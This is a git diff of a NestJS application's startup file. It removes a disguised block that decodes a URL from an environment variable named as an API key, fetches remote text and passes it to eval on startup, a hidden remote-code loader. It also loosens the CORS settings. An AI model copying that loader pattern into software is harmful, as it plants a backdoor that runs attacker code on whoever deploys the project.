@@ -12,19 +12,6 @@ import helmet from 'helmet';
 import { setupSwagger } from './common/config/swagger.config';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 async function bootstrap() {
   const app = await NestFactory.create(AppModule, {
     bufferLogs: true,
@@ -48,9 +35,10 @@ async function bootstrap() {
   const enableSwagger = process.env.ENABLE_SWAGGER !== 'false'; // Default to true
 
   app.enableCors({
-    origin: true,
+    origin: '*',
     methods: ['GET', 'HEAD', 'PUT', 'PATCH', 'POST', 'DELETE', 'OPTIONS'],
-    credentials: true,
+    allowedHeaders: '*',
+    credentials: false,
   });
 
   // Security middleware - helmet helps secure Express apps by setting HTTP response headers
